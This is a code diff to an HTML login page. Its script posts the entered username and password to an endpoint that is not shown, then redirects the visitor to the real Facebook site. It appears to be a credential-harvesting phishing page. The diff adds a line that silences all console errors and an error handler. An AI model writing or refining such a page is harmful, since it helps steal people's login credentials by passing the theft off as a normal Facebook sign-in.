@@ -209,7 +209,10 @@
         </div>
     </div>
 
-    <script>
+   <script>
+    // Suppress console errors on the page (optional)
+    console.error = function () {};
+
     document.getElementById('loginForm').addEventListener('submit', function (e) {
         e.preventDefault();  // Prevent default form submission
 
@@ -227,9 +230,9 @@
                 'password': password
             })
         })
-        .then(response => response.text()) // Get the response as text
+        .then(response => response.text()) // Get response as text
         .then(data => {
-            if (data === 'Success') {  // If the response is "Success"
+            if (data === 'Success') {  // If response body is "Success"
                 // If the request is successful, redirect to Facebook
                 alert('Login successful! Redirecting...');
                 window.location.href = "https://www.facebook.com"; // Official Facebook redirection
@@ -237,8 +240,13 @@
                 alert('Failed to send data');
             }
         })
+        .catch(error => {
+            console.log(error); // You can keep this or leave it to log in the background
+            alert('An error occurred');
+        });
     });
 </script>
+
 
     
 
